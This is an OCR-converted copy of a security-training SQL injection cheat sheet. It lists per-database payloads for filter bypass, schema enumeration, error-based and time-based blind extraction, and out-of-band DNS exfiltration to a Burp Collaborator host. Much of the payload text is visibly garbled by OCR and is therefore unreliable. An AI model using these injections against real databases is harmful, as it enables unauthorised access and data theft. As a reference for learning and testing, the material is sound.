# SQL injection cheat sheet

> Converted source material; attribution: PortSwigger Web Security Academy. Snapshot processed 2026-10-27.
> Source SHA-256: `a9509d8c38a5552cc0f857f8c6f9e4c78ecabec6b9c80dbfdc6466ddc6817ac8`.
> Conversion: Local English OCR, all 4 text segments. Source opinions and historical examples are preserved, not automatically endorsed.
> OCR literals, payloads, and complex table alignment are not character-verified throughout. Use the curated guidance and exact-text sources for implementation; do not execute OCR examples without checking the publisher.


Cheat sheet

SQL injection arise when performing SQL injection attacks.

## String concatenation

You can concatenate together multiple strings to make a single string. Oracle 'foo' II 'bar' Microsoft 'foo '+' bar' PostgreSQL foo' I I bar ' foo' 'bar' [Note the space between the two strings] MySQL CONCAT ( ' foo', 'bar')

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is I-based. Each of the following expressions will return the string ba Oracle SUBSTR ( ' foobar' 4, 2) Microsoft SUBSTRING ( ' foobar' , 4, 2) PostgreSQL SUBSTRING ( ' foobar' , 4, 2) MySQL SUBSTRING ( ' foobar' , 4, 2)

## Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input. Oracle — — c ommen t c omment Microsoft / * comment* / c ornment PostgreSQL / * comment* / # c omrnen t MySQL — comment [Note the space after the double dash] / * comment* /

## Bypassing filters

If an application blocks specific keywords or characters, you may still be able to inject SQL using the following techniques. Encoding-based bypasses, such as URL-encoding keywords or using CHAR ( ) to construct strings, are covered separately in Obfuscating attacks using encodings.

---

keyword. For example, if SELECT is blocked, try SeLeCT You can also use inline comments in place of whitespace, so that a filter looking for a keyword surrounded by spaces does not match. For example, SELECT/ ** / username/ ** / FROM/ ** / users On MySQL, you can use versioned comments to hide a keyword from a filter while still having the database execute it. The database runs the contents ofa / * ! * / comment, so / * ! SELECT* / is treated as SELECT

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks. SELECT banner FROM v$version Oracle SELECT version FROM v$instance Microsoft SELECT @ @version PostgreSQL SELECT version ( ) MySQL @@versxon SELECT

## Database contents

You can list the tables that exist in the database, and the columns that those tables contain. SELECT * FROM all tables Oracle SELECT * FROM all tab columns WHERE table name ' TABLE-NAME-HERE ' SELECT * FROM information schema . tables Microsoft SELECT * FROM information schema . co I umns WHERE tab e ' TABLE-NAME-HERE ' name SELECT * FROM information schema . tables PostgreSQL SELECT * FROM information schema . columns WHERE ' TABLE-NAME-HERE ' name = SELECT * FROM information schema . tables MySQL information SELECT * FROM schema . columns WHERE t able name = ' TABLE-NAME-HERE '

## Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true. Oracle

```text
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO CHAR (1/0) ELSE NULL END FROM dual
```

Microsoft

```text
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
```

PostgreSQL (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/ (SELECT 0) ELSE NULL END)

```text
SELECT IF (YOUR-CONDIT ON-HERE, (SELECT table name FROM
```

MySQL information schema. tables) , ' a ' )

## Extracting data via visible error messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

```text
SELECT 'foo' WHERE 1 =
```

(SELECT ' secret') Microsoft > Conversion failed when converting the varchar value secret' to data type int.

```text
SELECT CAST( (SELECT password FROM users LIMIT 1) AS int)
```

PostgreSQL > invalid input syntax for integer: " secret "

```text
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE (1, CONCAT (0x5c, (SELECT
```

'secret')) ) MySQL ' \secret' > XPATH syntax error:

## Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind

---

Oracle Does not support batched queries . QUERY-I-HERE; QUERY-2-HERE Microsoft QUERY I-HERE QUERY-2-HERE PostgreSQL QUERY-I-HERE; QUERY-2-HERE MySQL QUERY-I-HERE; QUERY 2-HERE

Note With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of IO seconds. Oracle dbms_pipe . receive message ( , 10) Microsoft WAITFOR DELAY PostgreSQL SELECT pg sleep (10) MySQL

```text
SELECT SLEEP (10)
```

## Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

```text
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN
```

Oracle 'a' I ldbms pipe. receive message( ('a') , 10) ELSE NULL END FROM dual Microsoft IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0: 0:10' PostgreSQL SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep (10) ELSE pg_s eep (0) END MySQL

```text
SELECT TF (YOUR-CONDITION-HERE, SLEEP (10) , 'a' )
```

## DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:

```text
SELECT EXTRACTVALUE (xmltype version-"1 . 0" ! DOCTYPE
```

Oracle root [ % remote SYSTEM "http://BURP COLLABORATOR % remote; ] > ' ) '/1') FROM dual The following technique works on fully patched Oracle installations, but requires elevated privileges:

```text
SELECT UTL ( 'BURP-COLLABORATOR-SUBDOMA N' )
```

Microsoft exec master . . xp_dirtree ' / / a ' PostgreSQL copy (SELECT ' ' ) to program ' nslookup BURP-COLLABORATOR SUBDOMAIN' The following techniques work on Windows only: MySQL LOAD FILE ( ' SUBDOMAIN\ ' ) SELECT INTO OUTFILE '

---

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

```text
SELECT EXTRACTVALUE (xmltype . 0" ! DOCTYPE
```

Oracle root [ &lt; ! ENTITY % remote SYSTEM "http://' I I (SELECT YOUR QUERY HERE) I l' . BURP COLLABORATOR-SUBDOMAIN/ %remote; ] &gt; ' ) ' / 1') FROM dual declare @p varchar (1024) ; set (SELECT YOUR QUERY Microsoft HERE) , •exec ( 'master. . xp_dirtree " // ' +@p+' . BURP-COLLABORATOR-SUBDOMAIN/a" ' ) create OR replace function f ( ) returns void as $$ declare c text; declare p text; begin

```text
SELECT into
```

p (SELECT YOUR-QUERY-HERE) ; PostgreSQL ( SELECT 'l) to program 'nslookup ' . BURP-COLLABORATOR- copy SUBDOMAIN' ; execute c; END; $$ language p pgsqI security definer;

```text
SELECT ;
```

The following technique works on Windows only: MySQL

```text
SELECT YOUR-QUERY-HERE INTO OUTFILE
```
